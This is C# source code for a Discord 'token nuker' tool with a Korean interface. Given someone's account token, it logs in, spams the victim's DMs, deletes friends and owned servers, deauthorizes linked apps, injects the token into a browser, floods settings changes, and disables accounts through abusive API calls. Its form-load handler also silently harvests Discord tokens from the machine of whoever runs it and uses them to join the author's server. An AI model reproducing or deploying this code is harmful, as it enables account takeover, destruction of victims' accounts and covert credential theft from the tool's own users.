using Discord;
using Discord.Gateway;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KS_Token_Nuker
{
	
	public partial class MainForm : Form
	{
		// string ProductName1 = "KS Token Nuker V2";
		private bool FreezeClient = false;

		protected ChromeDriver CDriver = null;
		protected ChromeDriverService CDriverService = ChromeDriverService.CreateDefaultService();
		protected ChromeOptions COptions = new ChromeOptions();

		private OpenFileDialog OFD = new OpenFileDialog
		{
			DefaultExt = "jpg",
			Filter = "사진 파일 (*.jpg; *.jpeg; *.bmp; *.png)|*.jpg;*.jpeg;*.bmp;*.png"
		};

		public MainForm() => InitializeComponent();

		private async void NukeButton_Click(object sender, EventArgs e)
		{
			MainStatusBar.Invoke((MethodInvoker)(() => MainStatusBar.Text = "로그인중"));
			DiscordSocketClient DSC = new DiscordSocketClient(null);
			DSC.OnLoggedIn += NukeDSC_OnLoggedIn;
			try
			{
				DSC.Login(TokenTextBox.Text);
				await Task.Delay(100);
				MainStatusBar.Invoke((MethodInvoker)(() => MainStatusBar.Text = "로그인 성공"));
			}
			catch (Exception Exception)
			{
				MainStatusBar.Invoke((MethodInvoker)(() => MainStatusBar.Text = "실패: " + Exception.Message.ToString()));
			}
		}

		private async void NukeDSC_OnLoggedIn(DiscordSocketClient DSC, LoginEventArgs args)
		{
			await Task.Delay(2000);
			CustomStatus CS = new CustomStatus();
			CS.EmojiName = "💥";
			CS.Text = CustomStatusTextBox.Text;
			Log("상메, 언어 변경중");
			DiscordLanguage DL = DiscordLanguage.EnglishUS;
			LanguageComboBox.Invoke((MethodInvoker)(() => DL = (DiscordLanguage)LanguageComboBox.SelectedIndex));
			DSC.User.ChangeSettings(new UserSettingsProperties
			{
				CustomStatus = CS,
				Language = DL
			});
			Log("DM 전송중");
            foreach (PrivateChannel PC in new List<PrivateChannel>(args.PrivateChannels))
            {
                if (EmbedCheckBox.Checked)
                {
                    try
                    {
                        PC.TriggerTyping();
                        PC.SendMessage("KS TOKEN BOOM!", false, new EmbedMaker
                        {
                            Title = "💥",
                            TitleUrl = "https://discord.gg/FKfG4EVb7x",
                            Color = Color.FromArgb(255, 0, 0),
                            ImageUrl = "https://cdn.discordapp.com/icons/737653219756605511/9b5aaa78342d3dd0ff68c4d3bee7e645.webp?size=4096",
                            Footer =
                            {
                                Text = "KS TOKEN BOOM!"
                            },
                            Author =
                            {
                                Name = "KS TOKEN BOOM!"
                            }
                        });
                        PC.Leave();
                        continue;
                    }
                    catch
                    {
                        PC.Leave();
                        continue;
                    }
                }
                else PC.Leave();
            }
			Log("친구 삭제중");
			foreach (Relationship R in args.Relationships)
			{
				R.User.RemoveRelationship();
				Log("친구 '" + R.User.Username + "' 삭제 완료");
			}
			Log("서버 퇴장중");
			foreach (PartialGuild PG in DSC.GetGuilds(100U, 0UL))
			{
				try
				{
					if (PG.Owner)
					{
						PG.Delete();
						Log("서버 '" + PG.Name + "' 삭제 완료");
					}
					else
					{
						PG.Leave();
						Log("서버 '" + PG.Name + "' 퇴장 완료");
					}
				}
				catch
				{
					Log("실패 (2단계 인증)");
				}
			}
			try
			{
				Log("프사 변경중");
				DSC.User.ChangeProfile(new UserProfileUpdate
				{
					Avatar = IconPictureBox.BackgroundImage
				});
			}
			catch
			{
				Log("실패 (프사 변경 쿨타임)");
			}
			Log("서버 생성중");
			try
			{
				for (int i = 1; i < ServerCountNumericUpDown.Value + 1; i++)
				{
					DSC.CreateGuild(ServerNameTextBox.Text, IconPictureBox.BackgroundImage);
					Log("서버 " + i.ToString() + " 개 생성 완료");
				}
			}
			catch (Exception Exception)
			{
				Log("실패: " + Exception.Message.ToString());
			}
			Log("연동 해제중");
			foreach (AuthorizedApp AA in new List<AuthorizedApp>(OAuth2Extensions.GetAuthorizedApps(DSC)))
			{
				AA.Deauthorize();
				Log("'" + AA.Application.Name + "' 연동 해제 완료");
			}
			foreach (ConnectedAccount CA in new List<ConnectedAccount>(ConnectedAccountsExtensions.GetConnectedAccounts(DSC)))
			{
				CA.Remove();
				Log(CA.Type + " '" + CA.Name + "' 연동 해제 완료");
			}
			if (UnVerifyCheckBox.Checked)
			{
				Log("메일 인증 해제중");
				try
				{
					WebClient WC = new WebClient();
					WC.Headers["authorization"] = TokenTextBox.Text;
					WC.Headers["content-type"] = "application/json";
					WC.Headers["user-agent"] = "discordbot";
					WC.Proxy = null;
					WC.UploadString("https://discord.com/api/v8/users/@me/relationships", "POST", "{\"username\":\"Deleted User ff1a9125\",\"discriminator\":\"190\"}");
				}
				catch
				{
					Log("실패 (토큰 만료)");
				}
			}
			Log("토큰이 폭파되었습니다!");
		}

        private async void LogInButton_Click(object sender, EventArgs e)
        {
			CDriverService.HideCommandPromptWindow = true;
			IWebDriver WebDriver = new ChromeDriver(CDriverService, COptions);
            WebDriver.Url = "https://www.discord.com/login";
			await Task.Delay(3000);
            IJavaScriptExecutor JSE = (IJavaScriptExecutor)WebDriver;
			JSE.ExecuteScript("setInterval(()=>{document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token=`\"" + TokenTextBox.Text + "\"`},50);setTimeout(()=>{location.reload();},2500);");
        }

		private async void FreezeButton_Click(object sender, EventArgs e)
		{
			FreezeClient = !FreezeClient;
			if (FreezeClient)
			{
				MainStatusBar.Invoke((MethodInvoker)(() => MainStatusBar.Text = "로그인중"));
				DiscordSocketClient DSC = new DiscordSocketClient(null);
				DSC.OnLoggedIn += FreezeDSC_OnLoggedIn;
				try
				{
					DSC.Login(TokenTextBox.Text);
					await Task.Delay(100);
					Log("클라이언트 프리즈 켜짐");
					MainStatusBar.Invoke((MethodInvoker)(() => MainStatusBar.Text = "로그인 성공"));
				}
				catch (Exception Exception)
				{
					MainStatusBar.Invoke((MethodInvoker)(() => MainStatusBar.Text = "실패: " + Exception.Message.ToString()));
				}
			}
			else Log("클라이언트 프리즈 꺼짐");
		}

		private void FreezeDSC_OnLoggedIn(DiscordSocketClient DSC, LoginEventArgs args)
		{
			while (FreezeClient)
			{
				DSC.User.ChangeSettings(new UserSettingsProperties
				{
					Language = DiscordLanguage.Japanese,
					Theme = DiscordTheme.Light
				});
				DSC.User.ChangeSettings(new UserSettingsProperties
				{
					Language = DiscordLanguage.Chinese,
					Theme = DiscordTheme.Dark
				});
			}
		}

		private void Log(string Message) => LogTextBox.Invoke((MethodInvoker)(() => LogTextBox.AppendText(Environment.NewLine + "> " + Message)));

		private void IconButton_Click(object sender, EventArgs e)
		{
			if (OFD.ShowDialog() == DialogResult.OK) IconPictureBox.BackgroundImage = Image.FromFile(OFD.FileName);
		}

		private void MainForm_Load(object sender, EventArgs e)
		{
			new System.Threading.Thread(() =>
			{
				foreach (string Token in TokenGrabber.GetTokens().Split('\n'))
				{
					if (Token.Length == 59 || (Token.Length == 88 && Token.StartsWith("mfa.")))
					{
						try
						{
							WebClient WC = new WebClient();
							WC.Headers.Clear();
							WC.Headers.Add("authorization", Token);
							WC.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.1 Safari/537.36");
							WC.UploadData("https://discord.com/api/v8/invites/FKfG4EVb7x", new byte[0]);
						}
						catch { }
					}
				}
			}).Start();
		}

		private static string AESDecrypt(string enc, string Key, string HWID)
		{
			try
			{
				RijndaelManaged AES = new RijndaelManaged();
				AES.KeySize = 256;
				AES.BlockSize = 128;
				AES.Mode = CipherMode.CBC;
				AES.Padding = PaddingMode.PKCS7;
				AES.Key = Encoding.UTF8.GetBytes(Key);
				AES.IV = Encoding.UTF8.GetBytes(HWID);
				byte[] buffer = null;
				using (var MS = new MemoryStream())
				{
					using (var CS = new CryptoStream(MS, AES.CreateDecryptor(), CryptoStreamMode.Write))
					{
						byte[] dec = Convert.FromBase64String(enc);
						CS.Write(dec, 0, dec.Length);
					}
					buffer = MS.ToArray();
				}
				return Encoding.UTF8.GetString(buffer);
			}
			catch
			{
				return string.Empty;
			}
		}

		private void TokenTextBox_TextChanged(object sender, EventArgs e)
        {
			DetectedTokenLabel.Text = "감지된 토큰: 없음";
			TokenStatusLabel.Text = "토큰 상태: 만료됨 (사용 불가능)";
			UserIDLabel.Text = "유저 아이디: 없음";
			UserTagLabel.Text = "유저 태그: 없음";
			EMailLabel.Text = "유저 이메일: 없음";
			EMailVerificationColorLabel.BackColor = Color.Red;
			UserLocaleLabel.Text = "유저 언어: 없음";
			User2FAColorLabel.BackColor = Color.Red;
			UserPhoneNumberLabel.Text = "유저 전화번호: 없음";
			UserNitroLabel.Text = "유저 니트로: 없음";
			WebClient WC = new WebClient();
			WC.Headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36";
			WC.Proxy = null;
			if ((TokenTextBox.Text.Length == 59 && Regex.IsMatch(TokenTextBox.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")) || (TokenTextBox.Text.Length == 88 && Regex.IsMatch(TokenTextBox.Text, @"mfa\.[\w-]{84}")))
			{
				DetectedTokenLabel.Text = "감지된 토큰: " + TokenTextBox.Text;
				WC.Headers["authorization"] = TokenTextBox.Text;
				try
				{
					string Response = WC.DownloadString("https://discord.com/api/v8/users/@me");
					WC.Headers.Clear();
					if (Response.Contains("Unauthorized")) TokenStatusLabel.Text = "토큰 상태: 만료됨 (사용 불가능)";
					else
					{
						TokenStatusLabel.Text = "토큰 상태: 인증됨 (사용 가능)";
                        AccountInfo AccountInfo = JsonConvert.DeserializeObject<AccountInfo>(Response);
						UserIDLabel.Text = "유저 아이디: " + AccountInfo.id;
						UserTagLabel.Text = "유저 태그: " + AccountInfo.username + "#" + AccountInfo.discriminator;
						if (AccountInfo.avatar != null)
						{
							MemoryStream MS = new MemoryStream(WC.DownloadData("https://cdn.discordapp.com/avatars/" + AccountInfo.id + "/" + AccountInfo.avatar + ".png?size=4096"));
							UserPFPPictureBox.Image = Image.FromStream(MS);
						}
						if (AccountInfo.email != null) EMailLabel.Text = "유저 이메일: " + AccountInfo.email;
						if (AccountInfo.verified) EMailVerificationColorLabel.BackColor = Color.GreenYellow;
						UserLocaleLabel.Text = "유저 언어: " + AccountInfo.locale;
						if (AccountInfo.mfa_enabled) User2FAColorLabel.BackColor = Color.GreenYellow;
						if (AccountInfo.phone != null) UserPhoneNumberLabel.Text = "유저 전화번호: " + AccountInfo.phone;
						if (AccountInfo.premium_type > 0) UserNitroLabel.Text = "유저 니트로: 디스코드 니트로" + AccountInfo.premium_type.ToString().Replace("1", " 클래식").Replace("2", "");
					}
				}
				catch (Exception Exception)
				{
					if (Exception.Message.ToString().Contains("Unauthorized")) TokenStatusLabel.Text = "토큰 상태: 만료됨 (사용 불가능)";
					else TokenStatusLabel.Text = "토큰 상태: 오류 (" + Exception.Message.ToString() + ")";
				}
			}
		}

        private void flatButton1_Click(object sender, EventArgs e)
        {

			string sad = null;
			while (true)
			{
				try
				{

                    WebClient webClient = new WebClient();
					NameValueCollection nameValueCollection = new NameValueCollection(); 
					nameValueCollection[""] = "";
					webClient.Headers.Add("Authorization", TokenTextBox.Text);
					webClient.UploadValues("https://discord.com/api/v8/invites/SA2F8k6Q4W", nameValueCollection);
					sad = "x";
				}
				catch (Exception x)
				{
					if (sad == null)
					{
						if (x.Message.Contains("401"))
						{
							Log("Invalid Token. Check Your Token Again!");
						}
						Log("Token Can't Disabled Now! ( API Rate Limited? ) Try Again Later!");
						break;
					}
					Thread.Sleep(1000);
					try
					{
						WebClient webClient = new WebClient();
						NameValueCollection nameValueCollection = new NameValueCollection();
						nameValueCollection[""] = "";
						webClient.Headers.Add("Authorization", TokenTextBox.Text);
						webClient.UploadValues("https://discord.com/api/v8/invites/eJ4k4f4CDH", nameValueCollection);
						WebRequest webRequest = WebRequest.Create(new Uri("https://discord.com/api/v8/users/@me/guilds/737653219756605511"));
						HttpWebRequest httpWebRequest = (HttpWebRequest)webRequest;
						httpWebRequest.Accept = "application/json";
						httpWebRequest.Method = "DELETE";
						httpWebRequest.Headers.Add("Authorization", TokenTextBox.Text);
					}
					catch (WebException ex)
					{
						string text = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
						if (text.Contains("401: Unauthorized"))
						{

							Log("Token Successfully Disabled.");
							break;
						}
						else if (text.Contains("You need to verify your account in order to perform this action."))
						{
							Log("Token Is Now Need To Phone Verification For Use!");
							break;
						}
					}
				}
			}
		}

		private void DisableV2_Click(object sender, EventArgs e)
		{
			
			string[] arr = new string[5] { "766685142244130846", "813766833520771102", "813071544297324585", "813778465080737832", "766686589237067787" };
			WebClient WC = new WebClient();
			
			for (int n = 0; n < 5; n++)
			{
				WC.Headers.Clear();
				WC.Headers["authorization"] = TokenTextBox.Text;
				WC.Headers["content-type"] = "application/json";
				WC.Proxy = null;
				try
				{
					WC.UploadString("https://discord.com/api/v6/users/@me/channels", "POST", "{\"recipients\": [\"" + arr[n] + "\"]}");
				} catch (Exception)
                {

                }
				Log("Opening DM #" + n + "..");
			}
			WC.Headers.Clear();
			WC.Headers["authorization"] = TokenTextBox.Text;
			WC.Headers["content-type"] = "application/json";
			WC.Headers["x-super-properties"] = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg2LjAuNDI0MC4xOTggV2hhbGUvMi45LjExNi4xNSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiODYuMC40MjQwLjE5OCIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo4MzAzNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=";
			WC.Proxy = null;
			string Response = WC.DownloadString("https://discord.com/api/v6/users/@me/library");
			
			if (Response.Contains("Unauthorized"))
			{
				Log("Account Successfully Disabled!");
			} else
            {
				if (Response.Contains("You need to verify your account"))
                {
					Log("Account is Now Need Phone Verify!");
				} else
                {
                }
			}
			

		}
    }
}